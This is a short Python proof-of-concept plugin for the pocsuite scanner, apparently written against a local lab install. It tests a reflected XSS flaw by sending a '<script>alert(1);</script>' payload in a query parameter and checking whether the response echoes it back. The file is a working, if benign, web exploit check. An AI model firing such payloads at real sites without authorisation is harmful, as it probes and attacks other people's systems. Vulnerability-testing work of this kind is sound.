#!/usr/bin/env python
# coding: utf-8
# Download Link: https://www.exploit-db.com/apps/969a9a0c12a219fb5e3658eeaff4e426-GeniXCMS-v0.0.3.zip

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID   ='123'
    version = '1'
    author = '小雨'
    vulDate = '2017-01-06'
    name = 'xss'
    appPowerLink = 'http://192.168.116.128/'
    appName = '无'
    appVersion = '0'
    vulType = ' XSS '
    desc = '''
    本地搭建环境随便写写
    '''

    def _verify(self):
        path = self.url + "/xss.php?XSS=<script>alert(1);</script>"
        res = req.get(path)
        return self.parse_verify(res)

    def parse_verify(self, res):
        output = Output(self)
        result = {}

        if res.status_code == 200 and '<script>alert(1);</script>' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = res.url
            output.success(result)

        else:
            output.fail('Internet Nothing returned')

        return output

    def _attack(self):

        return self._verify()


register(TestPOC)